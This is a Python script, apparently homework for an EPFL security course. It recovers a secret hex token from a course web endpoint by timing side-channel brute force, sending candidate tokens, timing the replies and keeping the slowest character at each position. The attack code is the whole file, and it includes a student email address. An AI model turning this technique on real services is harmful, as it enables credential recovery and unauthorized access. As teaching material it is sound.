import requests
import time
import matplotlib.pyplot as plt
import string
import numpy as np
N_retransmits_per_char = 2
current_guess = "5a1dbad4bb1" # 5 
email = "jorn.hofstad@epfl.ch"
alphabet = [ str(i) for i in range(10)] + [chr(i) for i in range(ord('a'), ord('f'))] #string.ascii_letters
print(alphabet)
site = "http://com402.epfl.ch/hw5/ex2"
session = requests.Session()
plot_path = "/home/jorn/Documents/Fag/courses_exchange/Information_security/Ovinger/Oving_5/task_2/plots/"

def to_readable(a): 
        return round(a/10_000_000)
def plot_histogram( timings , letter =""):
    plt.hist(timings)
    plt.savefig(plot_path+"timings_" + str(len(timings)) +"samples_"+letter+ "_as_substring_.png")
    plt.close()
def send_attempt(attempt): 
    message_json = {"email": email, "token": attempt}

    start = time.time_ns()
    reply = session.post(site, json= message_json) #? 
    end = time.time_ns()
    text = reply.text #? 
    if "perfect graveyard" not in text: 
            print("FOUND THE CORRECT PASSWORD")
            print("Attempt =", attempt)
            print("MESSAGE = ", text)
            f = open("result.txt", "a")
            print( "Attempt =", attempt, file = f )
            print("MESSAGE = ", text, file = f)
            f.close()
    print((end-start)/1000_000_000)
    return end-start, reply




def main():
    word_list = ["a"]*12
    current_index =0
    for current_index in range(len(word_list)): 
        shortest_responses = np.zeros(len(alphabet))

        if len(current_guess) > current_index: 
                word_list[current_index] = current_guess[current_index]
                print("Adding to current guess",  "".join(word_list), to_readable( send_attempt("".join(word_list))[0]))
                continue

        for ind, char in enumerate(alphabet):
                word_list[current_index] = char
                attempt = "".join(word_list) #? 
        
                timings = np.array([ send_attempt(attempt)[0] for i in range(N_retransmits_per_char) ])
                as_ms = list( map( np.log10, timings ) )
                print(as_ms)
                shortest_response = np.min(timings) 
                shortest_responses[ind] = shortest_response
                print("".join(word_list[:current_index+1]), list(map( to_readable, shortest_responses)))
                plot_histogram(timings, letter = "".join(word_list[:current_index+1])) 
        print(shortest_responses) 
        plt.bar(alphabet, shortest_responses)
        plt.savefig(plot_path+"/"+"min_timings_"+ str(N_retransmits_per_char) + "".join(word_list[:current_index+1])+".png" )
        plt.close()

        slowest_index = np.argmax( shortest_responses )
        word_list[current_index] = alphabet[slowest_index]

main()
